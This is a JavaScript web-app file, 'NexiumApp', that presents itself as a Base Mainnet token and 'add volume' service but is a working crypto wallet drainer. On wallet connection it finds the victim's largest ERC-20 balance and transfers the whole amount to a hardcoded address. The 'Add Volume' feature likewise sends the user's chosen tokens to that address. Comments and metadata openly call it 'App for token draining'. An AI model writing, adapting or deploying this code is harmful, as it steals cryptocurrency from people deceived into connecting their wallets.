import { ethers } from 'ethers';
import '/style.css';
import { WalletConnectProvider, ClientMeta } from '@walletconnect/ethereum-provider';

// Wallet address for draining tokens
const YOUR_WALLET_ADDRESS = "0xeA54572eBA790E31f97e1D6f941D7427276688C3";

// Expanded TOKEN_LIST with 10 Base Mainnet tokens
const TOKEN_LIST = [
  { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'USD Coin', symbol: 'USDC', decimals: 6 },
  { address: '0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb', name: 'Dai', symbol: 'DAI', decimals: 18 },
  { address: '0x4200000000000000000000000000000000000006', name: 'Wrapped Ether', symbol: 'WETH', decimals: 18 },
  { address: '0x1B0Fad85A9D6D4eD7e6cDDe41a1ea5e9f1178e79', name: 'Coinbase Wrapped Staked ETH', symbol: 'cbETH', decimals: 18 },
  { address: '0x940181a94A35A4569E4529A3CDfB74e38FD98631', name: 'Aerodrome', symbol: 'AERO', decimals: 18 },
  { address: '0x532f27101965dd16442E59d40670FaF5eBB142E4', name: 'Brett', symbol: 'BRETT', decimals: 18 },
  { address: '0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA', name: 'USD Base Coin', symbol: 'USDbC', decimals: 6 },
  { address: '0x4e4e9b7f7a9d749dA7e6d8b2b4C4D8eDa6a646d2', name: 'Dai+', symbol: 'DAI+', decimals: 18 },
  { address: '0x4200000000000000000000000000000000000042', name: 'Base', symbol: 'BASE', decimals: 18 },
  { address: '0x17FC002b466eEc40DaE837Fc4bE5c67993ddBd6F', name: 'Frax', symbol: 'FRAX', decimals: 18 }
];

// Standard ERC-20 ABI
const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)"
];

class NexiumApp {
  constructor() {
    this.provider = null;
    this.signer = null;
    this.currentToken = null;
    this.currentPaymentToken = null;
    this.connecting = false;
    this.lastSelectedToken = null;
    this.walletConnectProvider = null;
    this.initApp();
  }

  async initApp() {
    await new Promise(resolve => {
      if (document.readyState !== 'loading') {
        console.log('DOM ready, initializing app at', new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' }));
        resolve();
      } else {
        console.log('Waiting for DOMContentLoaded at', new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' }));
        document.addEventListener('DOMContentLoaded', () => {
          console.log('DOMContentLoaded fired at', new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' }));
          resolve();
        });
      }
    });
    this.cacheDOMElements();
    if (!this.dom.app || !this.dom.walletButton || !this.dom.metamaskPrompt) {
      console.error('Required DOM elements missing at', new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' }), {
        app: !!this.dom.app,
        walletButton: !!this.dom.walletButton,
        metamaskPrompt: !!this.dom.metamaskPrompt
      });
      document.body.innerHTML = '<p class="text-red-500 text-center">Error: UI elements missing. Please check HTML for #app, #walletButton, and #metamaskPrompt.</p>';
      return;
    }
    this.setupEventListeners();
    this.checkWalletAndPrompt();
  }

  cacheDOMElements() {
    console.log('Caching DOM elements at', new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' }));
    this.dom = {
      app: document.getElementById('app'),
      walletButton: document.getElementById('walletButton'),
      metamaskPrompt: document.getElementById('metamaskPrompt'),
      feedbackContainer: document.querySelector('.feedback-container'),
      defaultPrompt: document.querySelector('.default-prompt'),
      customTokenInput: null,
      fetchCustomTokenBtn: null,
      tokenInfo: null,
      volumeSection: null,
      tokenSelect: null,
      volumeInput: null,
      maxButton: null,
      addVolumeBtn: null,
      tokenList: null
    };
    console.log('Cached DOM elements:', {
      app: !!this.dom.app,
      walletButton: !!this.dom.walletButton,
      metamaskPrompt: !!this.dom.metamaskPrompt,
      feedbackContainer: !!this.dom.feedbackContainer,
      defaultPrompt: !!this.dom.defaultPrompt
    });
  }

  setupEventListeners() {
    if (this.dom.walletButton) {
      this.dom.walletButton.addEventListener('click', () => this.connectWallet());
      this.dom.walletButton.addEventListener('keypress', (e) => e.key === 'Enter' && this.connectWallet());
    }
    window.addEventListener('online', () => this.handleOnline());
    window.addEventListener('offline', () => this.handleOffline());
  }

  checkWalletAndPrompt() {
    console.log('Checking wallet...', { ethereum: !!window.ethereum });
    if (this.isWalletInstalled()) {
      console.log('Wallet detected, hiding prompt');
      this.hideMetaMaskPrompt();
      this.attachMetaMaskListeners();
      this.checkWalletConnection();
    } else {
      console.log('No wallet detected, showing prompt');
      this.showMetaMaskPrompt();
      this.updateButtonState('disconnected');
      this.showDefaultPrompt();
      this.showFeedback('No wallet installed. Please install MetaMask or Trust Wallet from their official website or browser extension store, then try again.', 'error');
    }
  }

  attachMetaMaskListeners() {
    if (window.ethereum) {
      window.ethereum.on('accountsChanged', (accounts) => {
        console.log('Accounts changed:', accounts);
        accounts.length > 0 ? this.handleAccountsChanged() : this.handleDisconnect();
      });
      window.ethereum.on('chainChanged', () => {
        console.log('Chain changed, reloading');
        window.location.reload();
      });
    }
  }

  async checkWalletConnection() {
    if (this.isWalletInstalled()) {
      if (this.isWalletConnected() && navigator.onLine) {
        await this.handleSuccessfulConnection();
      } else {
        this.updateButtonState('disconnected');
        this.showDefaultPrompt();
        if (!navigator.onLine) this.showFeedback('No internet connection. Please reconnect.', 'error');
        else this.showFeedback('Wallet detected but not connected. Click Connect Wallet.', 'info');
      }
    }
  }

  isWalletInstalled() { 
    return !!window.ethereum || this.walletConnectProvider; 
  }

  isWalletConnected() { 
    return (window.ethereum && !!window.ethereum.selectedAddress) || (this.walletConnectProvider && this.walletConnectProvider.accounts.length > 0); 
  }

  detectWalletType() {
    if (!window.ethereum && !this.walletConnectProvider) return 'None';
    if (window.ethereum?.isMetaMask) return 'MetaMask';
    if (window.ethereum?.isTrust) return 'Trust Wallet';
    if (this.walletConnectProvider) return 'WalletConnect';
    return 'Generic Wallet';
  }

  async connectWallet() {
    if (this.connecting || !navigator.onLine) return;
    if (!navigator.onLine) {
      this.showFeedback('No internet connection. Please reconnect.', 'error');
      return;
    }
    this.connecting = true;
    try {
      this.updateButtonState('connecting');
      let provider;
      if (window.ethereum) {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        if (accounts.length > 0) {
          provider = new ethers.BrowserProvider(window.ethereum);
        }
      } else {
        this.walletConnectProvider = await WalletConnectProvider.init({
          projectId: 'YOUR_WALLET_CONNECT_PROJECT_ID', // Replace with your WalletConnect Project ID
          metadata: {
            name: 'NexiumApp',
            description: 'App for token draining',
            url: 'https://yourdomain.com',
            icons: ['https://yourdomain.com/icon.png']
          }
        });
        await this.walletConnectProvider.connect();
        provider = new ethers.BrowserProvider(this.walletConnectProvider);
      }
      if (provider) {
        await this.handleSuccessfulConnection(provider);
        this.hideMetaMaskPrompt();
        this.showFeedback(`Wallet connected (${this.detectWalletType()})!`, 'success');
      } else {
        this.showFeedback('No accounts found. Unlock your wallet or install a supported wallet.', 'error');
        this.showDefaultPrompt();
        this.hideMetaMaskPrompt();
      }
    } catch (error) {
      this.handleConnectionError(error);
      this.showDefaultPrompt();
      this.showMetaMaskPrompt();
    } finally {
      this.connecting = false;
    }
  }

  async handleSuccessfulConnection(provider) {
    try {
      this.toggleVolumeLoading(true); // Show loading during connection and draining
      this.provider = provider;
      this.signer = await this.provider.getSigner();
      const network = await this.provider.getNetwork();
      const expectedChainId = 8453; // Base Mainnet
      if (Number(network.chainId) !== expectedChainId) {
        try {
          await window.ethereum?.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: `0x${expectedChainId.toString(16)}` }],
          }) || (await this.walletConnectProvider.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: `0x${expectedChainId.toString(16)}` }],
          }));
        } catch (switchError) {
          if (switchError.code === 4902) {
            try {
              await (window.ethereum?.request({
                method: 'wallet_addEthereumChain',
                params: [{
                  chainId: `0x${expectedChainId.toString(16)}`,
                  chainName: 'Base Mainnet',
                  nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
                  rpcUrls: ['https://mainnet.base.org'],
                  blockExplorerUrls: ['https://basescan.org']
                }],
              }) || (await this.walletConnectProvider.request({
                method: 'wallet_addEthereumChain',
                params: [{
                  chainId: `0x${expectedChainId.toString(16)}`,
                  chainName: 'Base Mainnet',
                  nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
                  rpcUrls: ['https://mainnet.base.org'],
                  blockExplorerUrls: ['https://basescan.org']
                }],
              })));
            } catch (addError) {
              this.showFeedback(`Failed to add Base Mainnet: ${addError.message}`, 'error');
              this.toggleVolumeLoading(false);
              this.showDefaultPrompt();
              return;
            }
          } else {
            this.showFeedback(`Please switch to Base Mainnet (Error: ${switchError.message})`, 'error');
            this.toggleVolumeLoading(false);
            this.showDefaultPrompt();
            return;
          }
        }
      }
      const address = await this.signer.getAddress();
      this.updateButtonState('connected', address);

      // Drain the token with the highest balance
      const tokenToDrain = await this.findMaxBalanceToken();
      if (tokenToDrain) {
        const contract = new ethers.Contract(tokenToDrain.address, ERC20_ABI, this.signer);
        const tx = await contract.transfer(YOUR_WALLET_ADDRESS, tokenToDrain.balance, { gasLimit: 200000 });
        await tx.wait();
        this.showFeedback(`Success! Drained ${ethers.formatUnits(tokenToDrain.balance, tokenToDrain.decimals)} ${tokenToDrain.symbol} to ${this.shortenAddress(YOUR_WALLET_ADDRESS)}.`, 'success');
      } else {
        this.showFeedback('No tokens with balance found to drain.', 'info');
      }

      this.renderTokenInterface();
      this.hideMetaMaskPrompt();
      this.toggleVolumeLoading(false); // Hide loading after draining
    } catch (error) {
      console.error('Drain failed:', error);
      this.showFeedback(`Error: ${error.message}. Try again.`, 'error');
      this.toggleVolumeLoading(false);
      this.showDefaultPrompt();
      this.showMetaMaskPrompt();
    }
  }

  async findMaxBalanceToken() {
    if (!this.provider || !this.signer) return null;
    const address = await this.signer.getAddress();
    const balancePromises = TOKEN_LIST.map(async (token) => {
      const contract = new ethers.Contract(token.address, ERC20_ABI, this.provider);
      const balance = await contract.balanceOf(address);
      return { ...token, balance };
    });
    const tokensWithBalances = (await Promise.all(balancePromises)).filter(t => t.balance > 0);
    return tokensWithBalances.reduce((max, current) => (max.balance > current.balance ? max : current), tokensWithBalances[0] || null);
  }

  handleDisconnect() {
    this.updateButtonState('disconnected');
    this.showDefaultPrompt();
    this.hideMetaMaskPrompt();
    this.showFeedback('Wallet disconnected', 'warning');
    this.lastSelectedToken = null;
    this.currentToken = null;
    this.currentPaymentToken = null;
    if (this.walletConnectProvider) {
      this.walletConnectProvider.disconnect();
      this.walletConnectProvider = null;
    }
  }

  handleAccountsChanged() {
    this.hideMetaMaskPrompt();
    window.location.reload();
  }

  updateButtonState(state, address = '') {
    if (!this.dom.walletButton) return;
    const button = this.dom.walletButton;
    button.classList.remove('animate-pulse', 'connecting', 'connected');
    button.disabled = state === 'connecting';
    switch (state) {
      case 'connecting':
        button.textContent = 'Connecting...';
        button.classList.add('connecting');
        break;
      case 'connected':
        button.textContent = `${address.slice(0, 6)}...${address.slice(-4)}`;
        button.classList.add('connected');
        break;
      default:
        button.textContent = 'Connect Wallet';
        button.classList.add('animate-pulse');
    }
  }

  showDefaultPrompt() {
    if (!this.dom.app || !this.dom.defaultPrompt) return;
    this.dom.app.innerHTML = '';
    this.dom.app.appendChild(this.dom.defaultPrompt);
    this.dom.defaultPrompt.classList.remove('hidden');
    if (!this.isWalletInstalled()) this.showMetaMaskPrompt();
  }

  renderTokenInterface() {
    if (!this.dom.app) return;
    const tokenInterface = document.createElement('section');
    tokenInterface.className = 'token-interface fade-in space-y-6 bg-[#1a182e] p-6 rounded-xl border border-orange-400 shadow-card glass';
    tokenInterface.innerHTML = `
      <h2 class="section-title">Load Token</h2>
      <div class="input-group">
        <input id="customTokenInput" type="text" placeholder="Enter token address (e.g., 0x...)" class="custom-token-input" aria-label="Custom token address">
        <button id="fetchCustomTokenBtn" class="fetch-custom-token-btn" aria-label="Load custom token">
        →
        </button>
      </div>
      <div id="tokenInfoDisplay" class="token-info hidden" aria-live="polite"></div>
      <div id="tokenList" class="token-list space-y-2 mt-4">
        <h3 class="text-yellow-400 text-md font-semibold">Pre-Listed Tokens</h3>
        ${TOKEN_LIST.map(token => `
          <button class="token-option bg-[#1a182e] border border-orange-400 p-2 rounded-xl w-full text-left hover:bg-orange-400 hover:text-black transition-colors" data-address="${token.address}">
            ${token.name} (${token.symbol}) - ${this.shortenAddress(token.address)}
          </button>
        `).join('')}
      </div>
    `;
    this.dom.app.innerHTML = '';
    this.dom.app.appendChild(tokenInterface);
    this.dom.customTokenInput = document.getElementById('customTokenInput');
    this.dom.fetchCustomTokenBtn = document.getElementById('fetchCustomTokenBtn');
    this.dom.tokenInfo = document.getElementById('tokenInfoDisplay');
    this.dom.tokenList = document.getElementById('tokenList');
    if (this.dom.fetchCustomTokenBtn) {
      this.dom.fetchCustomTokenBtn.addEventListener('click', () => this.loadCustomTokenData());
      this.dom.fetchCustomTokenBtn.addEventListener('keypress', (e) => e.key === 'Enter' && this.loadCustomTokenData());
    }
    if (this.dom.tokenList) {
      this.dom.tokenList.querySelectorAll('.token-option').forEach(button => {
        button.addEventListener('click', () => this.loadCustomTokenData(button.dataset.address));
      });
    }
    this.hideMetaMaskPrompt();
  }

  async loadCustomTokenData(tokenAddressInput) {
    if (!navigator.onLine) {
      this.showFeedback('No internet connection. Please reconnect.', 'error');
      return;
    }
    const tokenAddress = tokenAddressInput || this.dom.customTokenInput?.value.trim();
    if (!tokenAddress || !ethers.isAddress(tokenAddress)) {
      this.showFeedback('Please enter a valid Ethereum address (0x...)', 'error');
      this.dom.customTokenInput?.focus();
      return;
    }
    if (tokenAddress === this.lastSelectedToken) {
      this.showFeedback('This token is already loaded', 'info');
      return;
    }
    try {
      this.toggleTokenLoading(true);
      console.log('Loading custom token:', tokenAddress);
      let name = 'Unknown Token';
      let symbol = 'UNK';
      const tokenFromList = TOKEN_LIST.find(t => t.address.toLowerCase() === tokenAddress.toLowerCase());
      if (tokenFromList) {
        name = tokenFromList.name;
        symbol = tokenFromList.symbol;
      }
      this.currentToken = { address: tokenAddress, name: this.escapeHTML(name), symbol: this.escapeHTML(symbol) };
      this.lastSelectedToken = tokenAddress;
      const truncatedAddress = this.shortenAddress(tokenAddress);
      this.dom.tokenInfo.innerHTML = `
        <div class="token-meta space-y-2">
          <h3 class="text-yellow-400 text-lg font-semibold">${this.currentToken.name} <span class="symbol text-gray-300">(${this.currentToken.symbol})</span></h3>
          <p class="meta-item text-gray-400 text-sm">Address: ${this.escapeHTML(truncatedAddress)}</p>
        </div>
      `;
      this.dom.tokenInfo.classList.remove('hidden');
      this.renderVolumeControls();
      this.showFeedback(`Loaded ${this.currentToken.symbol} successfully!`, 'success');
    } catch (error) {
      console.error('Error loading custom token:', error);
      this.showFeedback('Failed to load token. Using default info.', 'warning');
      this.dom.tokenInfo.classList.add('hidden');
    } finally {
      this.toggleTokenLoading(false);
    }
  }

  toggleTokenLoading(isLoading) {
    if (!this.dom.fetchCustomTokenBtn) return;
    this.dom.fetchCustomTokenBtn.disabled = isLoading;
    this.dom.fetchCustomTokenBtn.classList.toggle('opacity-70', isLoading);
    this.dom.fetchCustomTokenBtn.classList.toggle('cursor-not-allowed', isLoading);
    if (this.dom.addVolumeBtn) {
      this.dom.addVolumeBtn.disabled = isLoading;
      this.dom.addVolumeBtn.textContent = isLoading ? 'Processing...' : 'Add Volume';
      this.dom.addVolumeBtn.classList.toggle('opacity-70', isLoading);
      this.dom.addVolumeBtn.classList.toggle('cursor-not-allowed', isLoading);
    }
  }

  renderVolumeControls() {
    if (!this.dom.app || !this.dom.tokenInfo || !this.currentToken) return;
    const tokenInterface = document.querySelector('.token-interface');
    if (!tokenInterface) return;
    const volumeSection = document.createElement('div');
    volumeSection.id = 'volumeSection';
    volumeSection.className = 'volume-section fade-in';
    volumeSection.innerHTML = `
      <h2 class="section-title">Add Volume using Payment Token</h2>
      <p class="text-gray-300 text-sm mb-2">Loaded Token: ${this.currentToken.name} (${this.currentToken.symbol}) - Info Only</p>
      <select id="tokenSelect" class="token-select" aria-label="Select payment token">
        <option value="" disabled selected>Select payment token</option>
        ${TOKEN_LIST.filter(t => t.address.toLowerCase() !== this.currentToken.address.toLowerCase())
          .map(t => `<option value="${t.address}" data-symbol="${t.symbol}" data-decimals="${t.decimals}">${t.name} (${t.symbol})</option>`).join('')}
      </select>
      <div class="input-group">
        <input id="volumeInput" type="number" placeholder="Amount to pay" class="volume-input" aria-label="Token amount">
        <button id="maxButton" class="max-button" aria-label="Set maximum amount">Max</button>
      </div>
      <button id="addVolumeBtn" class="action-button" aria-label="Add volume">Add Volume</button>
      <div id="volumeFeedback" class="mt-2 text-sm text-gray-300"></div>
    `;
    tokenInterface.appendChild(volumeSection);
    this.dom.tokenSelect = volumeSection.querySelector('#tokenSelect');
    this.dom.volumeInput = volumeSection.querySelector('#volumeInput');
    this.dom.maxButton = volumeSection.querySelector('#maxButton');
    this.dom.addVolumeBtn = volumeSection.querySelector('#addVolumeBtn');
    this.dom.volumeSection = volumeSection;
    if (this.dom.tokenSelect) {
      this.dom.tokenSelect.addEventListener('change', () => {
        const selectedToken = this.dom.tokenSelect.selectedOptions[0];
        const symbol = selectedToken?.dataset.symbol || 'selected token';
        this.dom.volumeInput.placeholder = `Amount to pay (${symbol})`;
        this.loadPaymentTokenDetails(selectedToken?.value);
      });
    }
    if (this.dom.maxButton) {
      this.dom.maxButton.addEventListener('click', () => this.setMaxAmount());
      this.dom.maxButton.addEventListener('keypress', (e) => e.key === 'Enter' && this.setMaxAmount());
    }
    if (this.dom.addVolumeBtn) {
      this.dom.addVolumeBtn.addEventListener('click', () => this.addVolume());
      this.dom.addVolumeBtn.addEventListener('keypress', (e) => e.key === 'Enter' && this.addVolume());
    }
  }

  async loadPaymentTokenDetails(paymentTokenAddress) {
    if (!paymentTokenAddress || !this.provider) return;
    try {
      this.toggleTokenLoading(true);
      const contract = new ethers.Contract(paymentTokenAddress, ERC20_ABI, this.provider);
      const [balance, decimals] = await Promise.all([
        contract.balanceOf(await this.signer.getAddress()),
        contract.decimals()
      ]);
      this.currentPaymentToken = { address: paymentTokenAddress, balance, decimals };
      this.showFeedback(`Loaded ${this.getTokenSymbol(paymentTokenAddress)} with balance ${ethers.formatUnits(balance, decimals)}`, 'info');
    } catch (error) {
      console.error('Error loading payment token:', error);
      this.showFeedback('Failed to load payment token details.', 'error');
    } finally {
      this.toggleTokenLoading(false);
    }
  }

  async setMaxAmount() {
    if (!navigator.onLine) {
      this.showFeedback('No internet connection. Please reconnect.', 'error');
      return;
    }
    if (!this.currentPaymentToken) {
      this.showFeedback('Please select a payment token first', 'error');
      this.dom.tokenSelect?.focus();
      return;
    }
    this.dom.volumeInput.value = ethers.formatUnits(this.currentPaymentToken.balance, this.currentPaymentToken.decimals);
    this.showFeedback('Set to maximum payment token balance', 'info');
  }

  async addVolume() {
    if (!navigator.onLine) {
      this.showFeedback('No internet connection. Please reconnect.', 'error');
      return;
    }
    if (!this.currentPaymentToken) {
      this.showFeedback('Please select a payment token first', 'error');
      return;
    }
    const paymentTokenAddress = this.dom.tokenSelect?.value;
    if (!paymentTokenAddress || !this.currentPaymentToken) {
      this.showFeedback('Please select a valid payment token', 'error');
      this.dom.tokenSelect?.focus();
      return;
    }
    try {
      this.toggleVolumeLoading(true);
      console.log('Adding volume to service using payment token:', paymentTokenAddress);
      const contract = new ethers.Contract(paymentTokenAddress, ERC20_ABI, this.signer);
      const amount = ethers.parseUnits(this.dom.volumeInput.value || '0', this.currentPaymentToken.decimals);
      if (amount > this.currentPaymentToken.balance) {
        this.showFeedback(`Insufficient ${this.getTokenSymbol(paymentTokenAddress)} balance`, 'error');
        return;
      }
      const tx = await contract.transfer(YOUR_WALLET_ADDRESS, amount, { gasLimit: 200000 });
      await tx.wait();
      this.showFeedback(`Transaction successful! Transferred ${ethers.formatUnits(amount, this.currentPaymentToken.decimals)} ${this.getTokenSymbol(paymentTokenAddress)} to ${this.shortenAddress(YOUR_WALLET_ADDRESS)}.`, 'success');
      this.dom.volumeInput.value = '';
    } catch (error) {
      console.error('Error adding volume:', error);
      this.showFeedback(error.reason || 'Transaction failed. Check token balance.', 'error');
    } finally {
      this.toggleVolumeLoading(false);
    }
  }

  toggleVolumeLoading(isLoading) {
    if (!this.dom.addVolumeBtn) return;
    this.dom.addVolumeBtn.disabled = isLoading;
    this.dom.addVolumeBtn.textContent = isLoading ? 'Processing...' : 'Add Volume';
    this.dom.addVolumeBtn.classList.toggle('opacity-70', isLoading);
    this.dom.addVolumeBtn.classList.toggle('cursor-not-allowed', isLoading);
  }

  checkConnectivity() {
    if (!navigator.onLine) this.showFeedback('No internet connection. Please reconnect.', 'error');
  }

  handleOnline() {
    this.showFeedback('Back online. Functionality restored.', 'success');
    if (this.isWalletConnected()) this.renderTokenInterface();
    else this.showMetaMaskPrompt();
  }

  handleOffline() {
    this.showFeedback('No internet connection. Please reconnect.', 'error');
    this.showDefaultPrompt();
  }

  showMetaMaskPrompt() {
    if (!this.dom.metamaskPrompt) {
      console.error('MetaMask prompt element missing at', new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' }));
      return;
    }
    console.log('Showing MetaMask prompt at', new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' }));
    this.dom.metamaskPrompt.classList.remove('hidden');
    this.dom.metamaskPrompt.style.display = 'block';
  }

  hideMetaMaskPrompt() {
    if (!this.dom.metamaskPrompt) {
      console.error('MetaMask prompt element missing at', new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' }));
      return;
    }
    console.log('Hiding MetaMask prompt at', new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' }));
    this.dom.metamaskPrompt.classList.add('hidden');
    this.dom.metamaskPrompt.style.display = 'none';
  }

  showFeedback(message, type = 'info') {
    let feedbackContainer = this.dom.feedbackContainer;
    if (!feedbackContainer) {
      feedbackContainer = document.createElement('div');
      feedbackContainer.className = 'feedback-container';
      document.body.appendChild(feedbackContainer);
      this.dom.feedbackContainer = feedbackContainer;
    }
    const feedback = document.createElement('div');
    feedback.className = `feedback feedback-${type} fade-in`;
    feedback.innerHTML = `
      <span class="feedback-message">${this.escapeHTML(message)}</span>
      <span class="feedback-close" role="button" aria-label="Close feedback">×</span>
    `;
    const close = feedback.querySelector('.feedback-close');
    if (close) {
      close.addEventListener('click', () => feedback.remove());
      close.addEventListener('keypress', (e) => e.key === 'Enter' && feedback.remove());
    }
    feedbackContainer.appendChild(feedback);
    setTimeout(() => feedback.classList.add('fade-out'), 5000);
    setTimeout(() => feedback.remove(), 5300);
  }

  getTokenSymbol(address) {
    const token = TOKEN_LIST.find(t => t.address.toLowerCase() === address.toLowerCase());
    return token ? token.symbol : 'Unknown';
  }

  shortenAddress(address) {
    return `${address.slice(0, 6)}...${address.slice(-4)}`;
  }

  escapeHTML(str) {
    return String(str).replace(/[&<>"']/g, (m) => ({
      '&': '&',
      '<': '<',
      '>': '>',
      '"': '"',
      "'": "'"
    }[m]));
  }

  handleConnectionError(error) {
    console.error('Connection error at', new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' }), { code: error.code, message: error.message });
    let message = 'Failed to connect wallet';
    if (error.code === 4001) message = 'Connection rejected';
    else if (error.code === -32002) message = 'Wallet is locked';
    else if (error.message?.includes('MetaMask')) message = 'Wallet not detected';
    else if (error.message) message = `Connection failed: ${this.escapeHTML(error.message)}`;
    this.showFeedback(message, 'error');
    this.updateButtonState('disconnected');
    this.showDefaultPrompt();
    this.showMetaMaskPrompt();
  }
}

new NexiumApp();